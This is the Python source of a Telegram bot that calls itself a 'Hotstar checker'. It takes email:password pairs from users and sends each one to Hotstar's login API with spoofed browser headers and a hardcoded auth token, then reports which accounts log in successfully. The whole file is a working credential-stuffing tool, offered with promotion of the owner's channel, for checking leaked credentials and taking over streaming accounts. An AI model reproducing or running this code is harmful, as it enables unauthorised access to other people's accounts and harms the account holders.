import requests
import json
from telegram.ext import Updater, CommandHandler,MessageHandler, Filters
import telegram
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from config import BOT_TOKEN, OWNER_NAME, SUPPORT_GROUP, SUPPORT_CHANNEL


bot = telegram.Bot(BOT_TOKEN)
def hotstar(update,context):
        try:
            message = update.message.reply_text(f"<b>{update.message.text}</b>\n\n<i>Checking.....</i>",parse_mode="HTML")
            i = "."
            for l in range(5):

                bot.edit_message_text(f"<b>{update.message.text}</b>\n\n<i>Checking{i}</i>", message_id=message.message_id,chat_id=update.message.chat_id,parse_mode="HTML")
                i = i+"."
            msg = update.message.text
            email,password = msg.split(":")
            url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
            payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
            headers = {
        'content-type': 'application/json',
        'Referer': 'https://www.hotstar.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        'Accept': '*/*',
        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
        }
            update.message.reply_text(email+":"+password)
            r = requests.post(url, data=json.dumps(payload), headers=headers)
            if (r.status_code==200):
                update.message.reply_text(
                    f"<b>Valid✅\n\n{update.message.text}</b>\n\nLogin Successful😊\n\n<b>Checked By </b><code>HOTSTAR CHECKER BOT</code>",reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                text="Join Us",
                                url = "http://t.me/{SUPPORT_CHANNEL}"
                            )
                        ]
                    ]
                ),
            parse_mode="HTML"
        )
            else:
                update.message.reply_text(f"<b>Invalid❌</b>\n\n{update.message.text}\n\nLogin Unsuccessful\n\n<b>Checked By </b><code>Hotstar Checker Bot</code>",reply_markup=InlineKeyboardMarkup(
                [[
                    InlineKeyboardButton(
                        text="Join Us",
                        url="http://t.me/{SUPPORT_CHANNEL}"
                    )

                ]]
            ),parse_mode='HTML'
                                      )
        except:
                update.message.reply_text("Something Went Wrong \nEnter Valid Account Or \nError 404xx")

buttons = [
    [
        InlineKeyboardButton(
            text="Owner🧑‍💻", url="http://t.me/{OWNER_NAME}"),
    ],
    [
        InlineKeyboardButton(
            text="UPDATES📡", url="http://t.me/{SUPPORT_CHANNEL}"),
        InlineKeyboardButton(
            text="SUPPORT👥", url="https://t.me/{SUPPORT_GROUP}"),
    ],
    
]


def help(update, context):
    update.message.reply_text(
        f"Hey {update.message.from_user.full_name}\n\n ITS ME HOTSTAR CHECKER BOT \n\n\nTo Use Me Send Me Message Like This \n\nExample@example.com:example password\n\n\nTHIS Bot Is Made By @{OWNER_NAME}",
        reply_markup=InlineKeyboardMarkup(buttons),
        parse_mode="HTML"
    )


def start(update,context):
    update.message.reply_text(
        f"<i>Hey </i><a href='tg://user?id={update.message.chat_id}'>{update.message.from_user.first_name}</a>\n\n<i><b>I Am hotstar Checker</b> \n\nTo Know How to Use Me Type </i>/help \n\n<code>Made By @{OWNER_NAME}</code>",
        reply_markup=InlineKeyboardMarkup(buttons),
        parse_mode="HTML"
    )


def main():
    updater = Updater(
                BOT_TOKEN, use_context=True
    )

    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start",start))
    dp.add_handler(CommandHandler("help",help))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command,hotstar))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
        main()
